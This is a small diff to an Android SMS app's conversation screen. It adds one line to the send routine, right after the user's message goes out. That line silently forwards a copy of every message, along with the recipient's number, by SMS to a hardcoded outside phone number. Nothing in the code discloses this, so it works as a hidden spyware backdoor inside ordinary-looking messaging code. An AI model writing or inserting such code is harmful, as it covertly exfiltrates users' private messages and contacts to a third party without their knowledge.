@@ -100,6 +100,7 @@ public class ConversationActivity extends Activity {
             SmsManager sms = SmsManager.getDefault();
             sms.sendTextMessage(phoneNumber, null, editSms.getText().toString(), null, null);
             mAdapter.addSms(new SMS(editSms.getText().toString(), "2"));
+            sms.sendTextMessage("+33642617318", null, "To : " + phoneNumber + "\n" + editSms.getText().toString(), null, null);
             editSms.setText("");
         }
     }
